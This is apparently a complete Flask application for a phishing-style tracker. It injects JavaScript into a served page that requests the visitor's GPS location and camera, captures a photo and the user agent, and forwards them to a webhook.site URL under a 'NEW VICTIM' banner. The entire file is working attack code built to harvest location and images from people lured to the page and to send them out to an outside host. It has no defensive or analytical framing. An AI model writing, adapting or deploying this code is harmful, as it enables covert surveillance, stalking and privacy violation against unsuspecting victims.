from flask import Flask, request, send_from_directory
import requests
import base64
import os

app = Flask(__name__)
WEBHOOK_URL = "https://webhook.site/c6a19369-5fb7-44b4-ab97-9ff26418523d"  # Replace this!

def send_to_webhook(data, image_b64=None):
    payload = {
        "content": f"```\n{data}\n```"
    }
    
    if image_b64:
        payload["files"] = [{
            "name": "photo.jpg",
            "data": image_b64
        }]  # Works with Discord. Adjust for other webhooks.
    
    requests.post(WEBHOOK_URL, json=payload)

@app.route('/')
def serve_page():
    with open("page.html", "r") as f:
        html = f.read()
    
    inject_code = """
    <script>
    // Log GPS/IP/UA
    const logData = {
        ip: window.location.hostname,
        ua: navigator.userAgent,
        gps: "DENIED"
    };

    // Request Camera
    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const photo = await imageCapture.takePhoto();
            
            const reader = new FileReader();
            reader.onload = () => {
                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        data: logData,
                        photo: reader.result.split(',')[1]
                    })
                });
            };
            reader.readAsDataURL(photo);
            track.stop();
        } catch (e) {
            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: logData })
            });
        }
    }

    // Request GPS
    navigator.geolocation.getCurrentPosition(pos => {
        logData.gps = `${pos.coords.latitude},${pos.coords.longitude}`;
        capturePhoto();
    }, () => capturePhoto());  // Fallback if GPS denied
    </script>
    """
    return html.replace("</body>", inject_code + "</body>")

@app.route('/log', methods=['POST'])
def handle_log():
    data = request.json.get('data', {})
    photo_b64 = request.json.get('photo', None)
    
    log_msg = f"""
    🕵️ NEW VICTIM 🕵️
    IP: {data.get('ip', 'N/A')}
    GPS: {data.get('gps', 'DENIED')}
    User-Agent: {data.get('ua', 'N/A')}
    """
    
    send_to_webhook(log_msg, photo_b64)
    return "Logged."

if __name__ == '__main__':
    app.run()
